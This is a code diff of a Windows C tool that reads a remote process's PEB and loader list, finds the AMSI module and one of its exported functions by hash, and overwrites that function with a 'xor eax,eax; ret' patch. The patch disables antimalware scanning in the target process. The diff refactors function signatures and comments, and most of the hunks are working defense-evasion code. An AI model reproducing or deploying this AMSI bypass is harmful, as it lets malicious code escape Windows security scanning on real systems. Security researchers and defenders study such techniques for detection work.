@@ -43,25 +43,23 @@ BOOL GetLoaderDataStructure(
 	__out LPBYTE        pPebBaseAddress
 );
 DWORD64 djb2(__in PBYTE str);
-BOOL GetModuleBaseAddress(
-	__in  PHANDLE       pHandle,
-	__in  PPEB_LDR_DATA pLdrData,
-	__out PDWORD64      pModuleBaseAddress
+PVOID GetModuleBaseAddress(
+	__in PHANDLE pHandle,
+	__in PPEB_LDR_DATA pLdrData
 );
 BOOL GetModuleExportDirectory(
 	__in  PHANDLE                 pHandle,
 	__out PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
-	__in  PDWORD64                pdwModuleBaseAddress
+	__in  PVOID                   pModuleBaseAddress
 );
-BOOL GetModuleFunctionAddress(
+PVOID GetModuleFunctionAddress(
 	__in  PHANDLE                 pHandle,
 	__in  PIMAGE_EXPORT_DIRECTORY pExportDirectory,
-	__in  PDWORD64                pdwModuleBaseAddress,
-	__out PDWORD64                pdwModuleFunctionAddress
+	__in  PVOID                   pModuleBaseAddress
 );
 BOOL PatchModuleFunction(
 	__in PHANDLE pHandle,
-	__in LPVOID  lpModuleFunctionAddress
+	__in PVOID   pModuleFunctionAddress
 );
 
 /*--------------------------------------------------------------------
@@ -129,12 +127,12 @@ INT wmain(INT argc, wchar_t* argv[]) {
 	/*--------------------------------------------------------------------
 	  Search for the base address of the AMSI module.
 	--------------------------------------------------------------------*/
-	DWORD64 dwModuleBaseAddress = 0;
-	if (!GetModuleBaseAddress(&hRemoteProcess, &LdrData, &dwModuleBaseAddress) || dwModuleBaseAddress == 0) {
+	PVOID pModuleBaseAddress = GetModuleBaseAddress(&hRemoteProcess, &LdrData);
+	if (pModuleBaseAddress == NULL) {
 		wprintf(L"[-] Invalid module base address: %d\n\n", g_pCurrentTeb->LastErrorValue);
 		return 0x01;
 	}
-	wprintf(L"   - Module base address: 0x%016llx\n", dwModuleBaseAddress);
+	wprintf(L"   - Module base address: 0x%016llx\n", (DWORD64)pModuleBaseAddress);
 	wprintf(L"[+] Searching module base address ... OK\n\n");
 
 	/*--------------------------------------------------------------------
@@ -142,7 +140,7 @@ INT wmain(INT argc, wchar_t* argv[]) {
 	--------------------------------------------------------------------*/
 	wprintf(L"[>] Searching function address ...\n");
 	IMAGE_EXPORT_DIRECTORY ExportDirectory = { 0 };
-	if (!GetModuleExportDirectory(&hRemoteProcess, &ExportDirectory, &dwModuleBaseAddress)) {
+	if (!GetModuleExportDirectory(&hRemoteProcess, &ExportDirectory, pModuleBaseAddress)) {
 		CloseHandle(hRemoteProcess);
 		return 0x01;
 	}
@@ -151,12 +149,12 @@ INT wmain(INT argc, wchar_t* argv[]) {
 	  Parse the export table of the module.
 	  Re-implementation of the GetProcAddress function.
 	--------------------------------------------------------------------*/
-	DWORD64 dwModuleFunctionAddress = 0;
-	if (!GetModuleFunctionAddress(&hRemoteProcess, &ExportDirectory, &dwModuleBaseAddress, &dwModuleFunctionAddress) || dwModuleFunctionAddress == 0 ) {
+	PVOID pModuleFunctionAddress = GetModuleFunctionAddress(&hRemoteProcess, &ExportDirectory, pModuleBaseAddress);
+	if (pModuleFunctionAddress == NULL) {
 		CloseHandle(hRemoteProcess);
 		return 0x01;
 	}
-	wprintf(L"   - Function address: 0x%016llx\n", dwModuleFunctionAddress);
+	wprintf(L"   - Function address: 0x%016llx\n", (DWORD64)pModuleFunctionAddress);
 	wprintf(L"[+] Searching function address ... OK\n\n");
 
 
@@ -164,7 +162,7 @@ INT wmain(INT argc, wchar_t* argv[]) {
 	  Parse the export table of the module.
 	  Re-implementation of the GetProcAddress function.
 	--------------------------------------------------------------------*/
-	if (!PatchModuleFunction(&hRemoteProcess, (LPVOID)dwModuleFunctionAddress)) {
+	if (!PatchModuleFunction(&hRemoteProcess, pModuleFunctionAddress)) {
 		CloseHandle(hRemoteProcess);
 		return 0x01;
 	}
@@ -210,12 +208,12 @@ PPEB RtlGetProcessEnvironmentBlock() {
   Summary:  Get PEB from a remote process.
 
   Args:     PHANDLE pHandle
-			   - Pointer to an handle of a remote process.
-		    PPEB pRemotePeb
-			   - Pointer to the PEB structure of the remote process.
-			PPROCESS_BASIC_INFORMATION pBasicInformation
-			   - Pointer to a structure that contains information about
-				 the remote process.
+               - Pointer to an handle of a remote process.
+	    PPEB pRemotePeb
+	       - Pointer to the PEB structure of the remote process.
+	    PPROCESS_BASIC_INFORMATION pBasicInformation
+	       - Pointer to a structure that contains information about
+	         the remote process.
 
   Returns:  BOOL
 -----------------------------------------------------------------F-F*/
@@ -243,13 +241,13 @@ BOOL GetRemoteProcessPeb(PHANDLE pHandle, PPEB pRemotePeb, PPROCESS_BASIC_INFORM
   Summary:  Get the loader data structure from a the remote process.
 
   Args:     PHANDLE pHandle
-			   - Pointer to an handle of a remote process.
-			PPEB_LDR_DATA pLdrData
-			   - Pointer to the loader data structure from the remote
-			     process.
-		    LPBYTE pPebBaseAddress
-			   - Base address of the PEB structure from the remote
-			     process.
+               - Pointer to an handle of a remote process.
+	    PPEB_LDR_DATA pLdrData
+	       - Pointer to the loader data structure from the remote
+		 process.
+	    LPBYTE pPebBaseAddress
+	       - Base address of the PEB structure from the remote
+		 process.
 
   Returns:  BOOL
 -----------------------------------------------------------------F-F*/
@@ -281,7 +279,7 @@ BOOL GetLoaderDataStructure(PHANDLE pHandle, PPEB_LDR_DATA pLdrData, LPBYTE pPeb
   Summary:  Get the hash of a ASCII string.
   
   Args:     PBYTE str
-			   - Pointer to an ASCII string to hash.
+               - Pointer to an ASCII string to hash.
 
   Returns:  DWORD64
 -----------------------------------------------------------------F-F*/
@@ -299,29 +297,27 @@ DWORD64 djb2(PBYTE str) {
   Function: GetModuleFunctionAddress
   Summary:  Parse all the LDR_DATA_TABLE_ENTRY structures of the 
             PEB_LDR_DATA structure of a remote process in order to find
-			the base address of module.
+	    the base address of module.
 
   Args:     PHANDLE pHandle
-			   - Pointer to an handle of a remote process.
+               - Pointer to an handle of a remote process.
             PPEB_LDR_DATA pLdrData
-			   - Pointer to the loader data structure from the remote
-				 process.
-		    PDWORD64 pdwModuleBaseAddress
-			   - Pointer to the address of the module function
-			     to patch.
+	       - Pointer to the loader data structure from the remote
+	         process.
 
-  Returns:  BOOL
+  Returns:  PVOID
 -----------------------------------------------------------------F-F*/
-BOOL GetModuleBaseAddress(PHANDLE pHandle, PPEB_LDR_DATA pLdrData, PDWORD64 pdwModuleBaseAddress) {
+PVOID GetModuleBaseAddress(PHANDLE pHandle, PPEB_LDR_DATA pLdrData) {
 	SIZE_T lBytesRead = 0;
 	PLIST_ENTRY pListEntry = (PLIST_ENTRY)((PBYTE)pLdrData->InMemoryOrderModuleList.Flink - 0x10);
 	PLIST_ENTRY pListEntryFirstElement = pListEntry;
+	PVOID pAddress = NULL;
 	do {
 		LDR_DATA_TABLE_ENTRY LdrDataEntry;
 		ReadProcessMemory(*pHandle, pListEntry, &LdrDataEntry, sizeof(LDR_DATA_TABLE_ENTRY), &lBytesRead);
 		if (lBytesRead != sizeof(LDR_DATA_TABLE_ENTRY)) {
 			wprintf(L"[-] Invalid loader data entry returned: %d\n\n", g_pCurrentTeb->LastErrorValue);
-			return FALSE;
+			return NULL;
 		}
 
 		// Get the name of the entry
@@ -336,7 +332,7 @@ BOOL GetModuleBaseAddress(PHANDLE pHandle, PPEB_LDR_DATA pLdrData, PDWORD64 pdwM
 
 			// Check the name of the module
 			if (MODULE_NAME_HASH == djb2(pLdrDataEntryNameAscii)) {
-				*pdwModuleBaseAddress = (DWORD64)LdrDataEntry.DllBase;
+				pAddress = LdrDataEntry.DllBase;
 			}
 
 			HeapFree(g_pCurrentPeb->ProcessHeap, 0, pLdrDataEntryName);
@@ -345,13 +341,13 @@ BOOL GetModuleBaseAddress(PHANDLE pHandle, PPEB_LDR_DATA pLdrData, PDWORD64 pdwM
 			pLdrDataEntryNameAscii = NULL;
 		}
 
-		if (*pdwModuleBaseAddress != 0)
-			return TRUE;
+		if (pAddress != NULL)
+			return pAddress;
 
 		pListEntry = (PLIST_ENTRY)((PBYTE)LdrDataEntry.InMemoryOrderLinks.Flink - 0x10);
 	} while (pListEntry != pListEntryFirstElement);
 
-	return FALSE;
+	return NULL;
 }
 
 /*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -360,28 +356,28 @@ BOOL GetModuleBaseAddress(PHANDLE pHandle, PPEB_LDR_DATA pLdrData, PDWORD64 pdwM
             export directory structure of the module.
 
   Args:     PHANDLE pHandle
-			   - Pointer to an handle of a remote process.
-			PIMAGE_EXPORT_DIRECTORY pImageExportDirectory
-			   - Pointer to the export directory structure of a remote
-			     process.
-			PDWORD64 pdwModuleBaseAddress
-			   - Pointer to the address of the module to patch.
+               - Pointer to an handle of a remote process.
+            PIMAGE_EXPORT_DIRECTORY pImageExportDirectory
+               - Pointer to the export directory structure of a remote
+                 process.
+            VOID pModuleBaseAddress
+               - Pointer to the address of the module to patch.
 
   Returns:  BOOL
 -----------------------------------------------------------------F-F*/
-BOOL GetModuleExportDirectory(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PDWORD64 pdwModuleBaseAddress) {
+BOOL GetModuleExportDirectory(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVOID pModuleBaseAddress) {
 	IMAGE_NT_HEADERS ModuleImageNtHeaders = { 0 };
 	IMAGE_DOS_HEADER ModuleImageDosHeader = { 0 };
 	SIZE_T lBytesRead = 0;
 
-	ReadProcessMemory(*pHandle, (LPCVOID)*pdwModuleBaseAddress, &ModuleImageDosHeader, sizeof(IMAGE_DOS_HEADER), &lBytesRead);
+	ReadProcessMemory(*pHandle, (LPCVOID)pModuleBaseAddress, &ModuleImageDosHeader, sizeof(IMAGE_DOS_HEADER), &lBytesRead);
 	if (ModuleImageDosHeader.e_magic != IMAGE_DOS_SIGNATURE || lBytesRead != sizeof(IMAGE_DOS_HEADER)) {
 		wprintf(L"[-] Invalid module DOS header: %d\n\n", g_pCurrentTeb->LastErrorValue);
 		return FALSE;
 	}
-	wprintf(L"   - DOS Header: 0x%016llx\n", *pdwModuleBaseAddress);
+	wprintf(L"   - DOS Header: 0x%016llx\n", (DWORD64)pModuleBaseAddress);
 
-	LPCVOID lpImageDosHeadersAddress = ((PBYTE)*pdwModuleBaseAddress + ModuleImageDosHeader.e_lfanew);
+	LPCVOID lpImageDosHeadersAddress = ((PBYTE)pModuleBaseAddress + ModuleImageDosHeader.e_lfanew);
 	ReadProcessMemory(*pHandle, lpImageDosHeadersAddress, &ModuleImageNtHeaders, sizeof(IMAGE_NT_HEADERS), &lBytesRead);
 	if (ModuleImageNtHeaders.Signature != IMAGE_NT_SIGNATURE || lBytesRead != sizeof(IMAGE_NT_HEADERS)) {
 		wprintf(L"[-] Invalid module NT header: %d\n\n", g_pCurrentTeb->LastErrorValue);
@@ -389,20 +385,14 @@ BOOL GetModuleExportDirectory(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pImageExp
 	}
 	wprintf(L"   - NT Headers: 0x%016llx\n", (DWORD64)lpImageDosHeadersAddress);
 
-	LPCVOID lpExportDirectoryAddress = ((PBYTE)*pdwModuleBaseAddress + ModuleImageNtHeaders.OptionalHeader.DataDirectory[0].VirtualAddress);
-	wprintf(L"0x%016llx\n", lpExportDirectoryAddress);
-	ReadProcessMemory(*pHandle, lpExportDirectoryAddress, pImageExportDirectory, sizeof(IMAGE_DATA_DIRECTORY), &lBytesRead);
-
-	wprintf(L"Read: %d\n", lBytesRead);
-	wprintf(L"size: %d\n", ModuleImageNtHeaders.OptionalHeader.DataDirectory[0].Size);
-
-
-	if (lBytesRead != ModuleImageNtHeaders.OptionalHeader.DataDirectory[0].Size) {
+	PIMAGE_DATA_DIRECTORY DataDirectory = ModuleImageNtHeaders.OptionalHeader.DataDirectory;
+	ReadProcessMemory(*pHandle, ((PBYTE)pModuleBaseAddress + DataDirectory[0].VirtualAddress), pImageExportDirectory, DataDirectory[0].Size, &lBytesRead);
+	if (lBytesRead != DataDirectory[0].Size) {
 		wprintf(L"[-] Invalid export directory returned: %d\n\n", g_pCurrentTeb->LastErrorValue);
 		return FALSE;
 	}
 
-	wprintf(L"   - Export directory: 0x%016llx\n", (DWORD64)lpExportDirectoryAddress);
+	wprintf(L"   - Export directory: 0x%016llx\n", (DWORD64)((PBYTE)pModuleBaseAddress + DataDirectory[0].VirtualAddress));
 	return TRUE;
 }
 
@@ -412,58 +402,55 @@ BOOL GetModuleExportDirectory(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pImageExp
             address of the function to patch.
 
   Args:     PHANDLE pHandle
-			   - Pointer to an handle of a remote process.
-			PIMAGE_EXPORT_DIRECTORY pImageExportDirectory
-			   - Pointer to the export directory structure of a remote
-				 process.
-			PDWORD64 pdwModuleBaseAddress
-			   - Pointer to the address of the module to patch.
-			PDWORD64 pdwModuleFunctionAddress
-			   - Pointer to the address of the module function
-			     to patch.
+               - Pointer to an handle of a remote process.
+	    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory
+	       - Pointer to the export directory structure of a remote
+		 process.
+	    PVOID pModuleBaseAddress
+	       - Pointer to the address of the module to patch.
 
-  Returns:  BOOL
+  Returns:  PVOID
 -----------------------------------------------------------------F-F*/
-BOOL GetModuleFunctionAddress(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pExportDirectory, PDWORD64 pdwModuleBaseAddress, PDWORD64 pdwModuleFunctionAddress) {
-	PDWORD aAddressOfFunctions = (PDWORD)((PBYTE)*pdwModuleBaseAddress + pExportDirectory->AddressOfFunctions);
-	PDWORD aAddressOfNames = (PDWORD)((PBYTE)*pdwModuleBaseAddress + pExportDirectory->AddressOfNames);
-	PWORD aAddressOfNameOrdinales = (PWORD)((PBYTE)*pdwModuleBaseAddress + pExportDirectory->AddressOfNameOrdinals);
+PVOID GetModuleFunctionAddress(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pExportDirectory, PVOID pModuleBaseAddress) {
+	PDWORD aAddressOfFunctions = (PDWORD)((PBYTE)pModuleBaseAddress + pExportDirectory->AddressOfFunctions);
+	PDWORD aAddressOfNames = (PDWORD)((PBYTE)pModuleBaseAddress + pExportDirectory->AddressOfNames);
+	PWORD aAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBaseAddress + pExportDirectory->AddressOfNameOrdinals);
 
 	SIZE_T lBytesRead = 0;
-	LPVOID lpFunctionAddress = 0;
+	PVOID pFunctionAddress = NULL;
 	for (WORD cx = 0; cx < pExportDirectory->NumberOfNames; cx++) {
 		DWORD dwAddressOfNamesValue = 0;
 		ReadProcessMemory(*pHandle, aAddressOfNames + cx, &dwAddressOfNamesValue, sizeof(DWORD), NULL);
 
 		PBYTE pFunctionName = HeapAlloc(g_pCurrentPeb->ProcessHeap, HEAP_ZERO_MEMORY, MAX_PATH);
-		ReadProcessMemory(*pHandle, (PBYTE)*pdwModuleBaseAddress + dwAddressOfNamesValue, pFunctionName, MAX_PATH, NULL);
+		ReadProcessMemory(*pHandle, (PBYTE)pModuleBaseAddress + dwAddressOfNamesValue, pFunctionName, MAX_PATH, NULL);
 
 		if (MODULE_FUNCTION_HASH == djb2(pFunctionName)) {
 			WORD wFunctionOrdinal = 0;
 			ReadProcessMemory(*pHandle, aAddressOfNameOrdinales + cx, &wFunctionOrdinal, sizeof(WORD), &lBytesRead);
 			if (lBytesRead != sizeof(WORD)) {
 				wprintf(L"[-] Error while getting the ordinal of the function");
-				return FALSE;
+				return NULL;
 			}
 
 			DWORD dwFunctionAddressOffset = 0;
 			ReadProcessMemory(*pHandle, aAddressOfFunctions + wFunctionOrdinal, &dwFunctionAddressOffset, sizeof(DWORD), &lBytesRead);
 			if (lBytesRead != sizeof(DWORD)) {
 				wprintf(L"[-] Error while getting the address of the function");
-				return FALSE;
+				return NULL;
 			}
 
-			*pdwModuleFunctionAddress = (DWORD64)*pdwModuleBaseAddress + dwFunctionAddressOffset;
+			pFunctionAddress = (DWORD64)pModuleBaseAddress + dwFunctionAddressOffset;
 		}
 
 		HeapFree(g_pCurrentPeb->ProcessHeap, HEAP_ZERO_MEMORY, pFunctionName);
 		pFunctionName = NULL;
 
-		if (*pdwModuleFunctionAddress != 0)
-			break;
+		if (pFunctionAddress != NULL)
+			return pFunctionAddress;
 	}
 
-	return TRUE;
+	return NULL;
 }
 
 /*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -471,14 +458,14 @@ BOOL GetModuleFunctionAddress(PHANDLE pHandle, PIMAGE_EXPORT_DIRECTORY pExportDi
   Summary:  Patch the AMSI module function of a remote process.
 
   Args:     PHANDLE pHandle
-			   - Pointer to an handle of a remote process.
-			LPVOID lpModuleFunctionAddress
-			   - Address of the module function to patch, in the remote
-			     process.
+               - Pointer to an handle of a remote process.
+	    PVOID pModuleFunctionAddress
+	       - Address of the module function to patch, in the remote
+		 process.
 
   Returns:  BOOL
 -----------------------------------------------------------------F-F*/
-BOOL PatchModuleFunction(PHANDLE pHandle, LPVOID lpModuleFunctionAddress) {
+BOOL PatchModuleFunction(PHANDLE pHandle, PVOID lpModuleFunctionAddress) {
 	BYTE patch[] = { 0x31, 0xC0, 0xC3 };
 	SIZE_T lBytesWritten = 0;
 
